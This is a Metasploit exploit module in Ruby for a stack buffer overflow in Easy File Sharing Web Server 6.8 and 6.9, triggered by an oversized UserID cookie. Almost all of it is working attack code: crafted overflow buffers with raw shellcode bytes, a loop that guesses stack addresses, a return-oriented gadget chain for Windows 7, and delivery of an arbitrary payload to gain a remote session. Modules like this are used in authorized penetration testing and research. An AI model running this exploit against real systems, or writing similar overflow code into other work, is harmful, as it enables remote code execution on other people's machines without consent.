##
## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Easy File Sharing Web Server Remote Code Execution',
                      'Description'    => %q{
        # Easy File Sharing Web Server v6.8
        # This module is a simple port of an exploit written by superkojiman.
        # https://www.exploit-db.com/exploits/33352/
        #
        # Exploit Title: Easy File Sharing Web Server 6.8 stack buffer overflow
        # Date: 10 May 2014
        # Exploit Author: superkojiman - http://www.techorganic.com
        # Tested on: English version of Windows XP Professional SP2 and SP3
        #
        # By setting UserID in the cookie to a long string, we can overwrite EDX which
        # allows us to control execution flow when the following instruction is
        # executed: 0x0045C8C2: CALL DWORD PTR DS:[EDX+28]

        ------------------------------------------------------------------------------

        # Easy File Sharing Web Server v6.9
        # This module is a simple port of an exploit written by Tracy Turben.
        # https://www.exploit-db.com/exploits/37951/
        #
        # Exploit Title: Easy File Sharing Web Server v6.9 - USERID Remote Buffer Overflow
        # Date:          2015-08-22
        # Author:        Tracy Turben (tracyturben@gmail.com)
        # Tested on:     Win7x32-EN,Win7x64-EN
        # Special Thanks To: Julien Ahrens for the crafted jmp esp Trick ;)
        # Credits for vulnerability discovery:
        # superkojiman (http://www.exploit-db.com/exploits/33453/)
        #
        # This module exploits the buffer used to store the USERID component of a HTTP request.
        # A specially crafted request will overflow this buffer resulting in arbitrary code
        # execution with the permissions of the user running the daemon.
                      },
                        'License' => MSF_LICENSE,
                        'Author'  =>	[
                          'superkojiman - http://www.techorganic.com', # v6.8 exploit
                          'Tracy Turben - tracyturben@gmail.com', # v6.9 exploit
                          'thesubtlety - noah@thesubtlety.com', # Metasploit Module (v6.8)
                          'justarandomuser - justarandomuser@github.com', #Metasploit Module (v6.9)
                        ],
                        'References' =>
                        [
                          [  'URL', 'https://www.exploit-db.com/exploits/33352/'  ],
                          [  'URL', 'https://www.exploit-db.com/exploits/37951/'  ],
                        ],
                        'DisclosureDate' => 'May 10 2014', #v6.8
                        'DisclosureDate' => 'Aug 22 2015', #v6.9
                        'Platform' => 'win',
                        'Privileged' => false,
                        'Payload' =>
                          {
                          'BadChars' => "\x00\x0a\x0d\x3b\x20",
                          'DisableNops' => true,
                          },
                        'Targets' =>
                        [
                          [ 'Automatic', {} ],
                          [ 'Easy File Sharing Web Server 6.8 (Windows XP Pro SP2/SP3)', {} ],
                          [ 'Easy File Sharing Web Server 6.9 (Windows 7 Home Premium SP1, x32/x64)', {} ],
                        ],
                        'DefaultOptions' => { 'EXITFUNC' => 'thread' },
                        'DefaultTarget' => 0))
  end

  def check
    res = send_request_cgi({ 'uri' => '/' })
    if (res && res.headers['Server']) =~ /Easy File Sharing Web Server v(6\..*)$/
      case $1
      when /6\.8/
        return Exploit::CheckCode::Appears
      when /6\.9/
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Unknown
      end
    end
    Exploit::CheckCode::Safe
  end

  def req(sploit)
        send_request_cgi({
          'uri' => '/vfolder.ghp',
          'method' => 'GET',
          'headers' => {
            'Accept' => ' text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language' => 'en-us',
            'Accept-Encoding' => 'gzip, deflate',
            'Cookie' => "SESSIONID=6771; UserID=#{sploit}; PassWD=;",
            'Connection' => 'Keep-Alive'
          }
        })

  end

  def exploit
    mytarget = target

    if target.name =~ /Automatic/
      res = send_request_cgi({ 'uri' => '/' })
      if (res && res.headers['Server']) =~ /Easy File Sharing Web Server v(6\..*)$/
        case $1
        when /6\.8/
          mytarget = targets[1]
          print_status "Using target #{mytarget.name}"
        when /6\.9/
          mytarget = targets[2]
          print_status "Using target #{mytarget.name}"
        else
          print_error "No target found for version #{$1}"
          return
        end
      end
    else
      print_error "No target found"
    end

    case mytarget.name
      when /Windows XP/
        print_status "Trying #{rhost}:#{rport}..."
        print_status "If at first you don't succeed, try, try again :)"
        print_status "We're guessing an address on the stack. It will be a few moments..."

        (1..255).each do |i|
          n =
            if i < 16
              '0' + i.to_s(16)
            else
              i.to_s
            end

          # craft the value of EDX that will be used in CALL DWORD PTR DS:[EDX+28]
          guess = "0x01" + n + "6940"

          sploit =  rand_text_alpha(64)               # padding
          sploit += "\x81\xee\x70\xff\xff\xff"        # SUB ESI,-90
          sploit += "\xff\xe6"                        # JMP ESI
          sploit += rand_text_alpha(8)                # padding
          sploit += [guess.to_i(16)].pack("<I")       # overwrite EDX with
          # pointer to CALL ESI
          sploit += rand_text_alpha(108)              # padding
          sploit += [0x10023701].pack("<I")           # pointer to CALL ESI
          sploit += make_nops(20)                     # NOP sled
          sploit += payload.encoded

          req(sploit)

          handler
          break if session_created?
        end

       when /Windows 7/
         junk0 = "\x90" * 80

         # 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll]
         # The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
         # Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
         call_edx = [0x1001D8C8].pack('V')
         junk1 = "\x90" * 396
         ppr = [0x10010101].pack('V') # POP EBX # POP ECX # RETN [ImageLoad.dll]

         # Since 0x00 would break the exploit 00520498 PUSH ESP needs to be crafted on the stack.
         crafted_jmp_esp = [0xA4523C15].pack('V')
         test_bl = [0x10010125].pack('V') # contains 00000000 to pass the JNZ instruction
         kungfu = [0x10022aac].pack('V')  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
         kungfu << [0xDEADBEEF].pack('V') # filler
         kungfu << [0xDEADBEEF].pack('V') # filler
         kungfu << [0x1001a187].pack('V') # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
         kungfu << [0x1002466d].pack('V') # PUSH EAX # RETN [ImageLoad.dll]

         nopsled="\x90" * 20
         sploit = junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + payload.encoded

         print_status("Sending request...")
         req(sploit)

         handler
    end

  end
end
